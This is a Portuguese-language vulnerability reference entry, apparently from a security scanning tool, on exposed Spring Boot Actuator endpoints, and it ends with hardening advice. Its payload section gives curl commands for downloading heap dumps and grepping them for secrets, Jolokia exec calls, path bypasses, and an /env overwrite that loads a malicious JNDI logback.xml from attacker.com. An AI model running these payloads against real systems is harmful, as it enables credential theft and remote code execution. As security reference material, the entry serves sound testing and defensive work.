---
id: spring_actuator_exposure
title: "Spring Boot Actuator Exposure"
module: "actuator"
severity: "HIGH"
cwe_id: "CWE-200"
cwe_title: "Exposure of Sensitive Information to an Unauthorized Actor"
cvss_vector: "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
vrt_id: "server_security_misconfiguration.sensitive_data_exposure"
---

## Summary
Endpoints do Spring Boot Actuator expostos sem autenticação revelam configurações, variáveis de ambiente, mappings, beans e heap dumps, podendo levar a RCE e roubo de credenciais.

## Description
O Actuator adiciona endpoints operacionais ao Spring Boot. Se `management.endpoints.web.exposure.include=*` ou o endpoint é exposto publicamente sem segurança, um atacante pode acessar:

- `/actuator/env`: propriedades e variáveis de ambiente (muitas vezes com segredos).
- `/actuator/heapdump`: dump da heap JVM, contendo senhas, tokens e chaves.
- `/actuator/mappings`: rotas internas e versões de API.
- `/actuator/beans`: grafo de beans e configurações.
- `/actuator/httptrace`/`httpexchanges`: requisições e headers recentes.
- `/actuator/loggers`: alteração de níveis de log em runtime.
- `/actuator/threaddump`, `/actuator/metrics`, `/actuator/health`.
- `/actuator/jolokia`: ponte JMX que pode levar a RCE.
- `/actuator/gateway/routes`, `/actuator/refresh`, `/actuator/restart`.

Em versões antigas, o `/env` permite sobrescrever propriedades (ex.: `logging.config`) e alcançar RCE. O `/heapdump` é um dos achados mais valiosos em bug bounty porque expõe segredos em texto claro.

## Impact
- Vazamento de credenciais de banco, chaves de API, tokens e segredos de cloud.
- RCE via Jolokia, `/env` ou `/refresh` em configurações vulneráveis.
- Mapeamento interno e descoberta de endpoints administrativos.
- Modificação de configuração em runtime (loggers, rotas, feature flags).
- Impacto HIGH; CRITICAL quando há heapdump com credenciais ou RCE.

## Payloads and Bypasses
```bash
# Descoberta
curl -s https://alvo.com/actuator
curl -s https://alvo.com/actuator/health
curl -s https://alvo.com/actuator/env
curl -s https://alvo.com/actuator/heapdump -o heapdump.hprof
curl -s https://alvo.com/actuator/mappings
curl -s https://alvo.com/actuator/beans
curl -s https://alvo.com/actuator/httptrace
curl -s https://alvo.com/actuator/threaddump

# Caminhos legados (Spring Boot 1.x)
curl -s https://alvo.com/env
curl -s https://alvo.com/heapdump
curl -s https://alvo.com/mappings
curl -s https://alvo.com/beans
curl -s https://alvo.com/trace
curl -s https://alvo.com/dump

# Variações de prefixo / base path
/actuator/
/management/actuator/
/api/actuator/
/internal/actuator/
/actuator;.js

# Jolokia
curl -s https://alvo.com/actuator/jolokia/list
curl -s https://alvo.com/actuator/jolokia/exec/java.lang:type=Runtime/getSystemProperties

# Heap dump: extrair strings
strings heapdump.hprof | grep -iE 'password|secret|token|aws_|jdbc:|api[_-]?key'
```

Exploração de `/env` para RCE (quando sobrescrita habilitada):
```json
POST /actuator/env
Content-Type: application/json
{"name":"logging.config","value":"http://attacker.com/logback.xml"}
```

`logback.xml` malicioso (JNDI):
```xml
<configuration>
  <insertFromJNDI env-entry-name="rmi://attacker.com:1099/Exploit" as="x"/>
</configuration>
```

Bypasses:
```text
- Prefixos alternativos e case: /Actuator, /actuator/
- Extensões: /actuator/env.json, /actuator/env;.js
- Path traversal: /actuator/../actuator/env
- Header X-Forwarded-Prefix: /actuator
- Vhosts internos e portas de management (8081, 9090)
- Acesso via proxy reverso que não bloqueia /actuator
```

Casos reais e mentalidade de ataque (RWBH): em aplicações Spring Boot, o padrão é varrer `/actuator`, baixar `/heapdump` e ler `/env`; o atacante usa os segredos do dump para pivotar para cloud e banco.

## Target Context (Crawler Hints)
- **Parâmetros comuns:** `name`, `value` (POST /env); `endpoint`; headers `X-Forwarded-Prefix`.
- **Paths comuns:** `/actuator`, `/actuator/env`, `/actuator/heapdump`, `/actuator/mappings`, `/actuator/beans`, `/actuator/httptrace`, `/actuator/loggers`, `/actuator/threaddump`, `/actuator/jolokia`, `/env`, `/heapdump`, `/mappings`, `/beans`, `/trace`.
- **Sinais:** JSON com `_links`; `whitelabel` error; Spring Boot headers; `management.endpoints.web.exposure.include=*`; heapdump grande.

## Recommendation
1. Expor apenas endpoints necessários (`health`, `info`) e desabilitar o resto:
```yaml
management:
  endpoints:
    web:
      exposure:
        include: health,info
      base-path: /internal/actuator
  endpoint:
    env:
      show-values: never
    heapdump:
      enabled: false
    jolokia:
      enabled: false
    shutdown:
      enabled: false
```
2. Colocar o Actuator em porta separada, vinculada a localhost/rede interna, com autenticação e mTLS.
3. Proteger com Spring Security e roles administrativas; nunca deixar público.
4. Não expor `env`, `heapdump`, `jolokia`, `threaddump`, `mappings`, `beans`, `httptrace` em produção.
5. Mascarar segredos (`show-values: never`) e usar Secret Manager em vez de variáveis em texto claro.
6. Bloquear `/actuator` no proxy/WAF como defesa em profundidade.
7. Atualizar Spring Boot e dependências; versões antigas têm CVEs de Actuator.
8. Monitorar acessos a `/actuator/*` e downloads de heapdump; alertar imediatamente.
9. Se houver exposição, rotacionar todos os segredos que possam estar no heap/env.
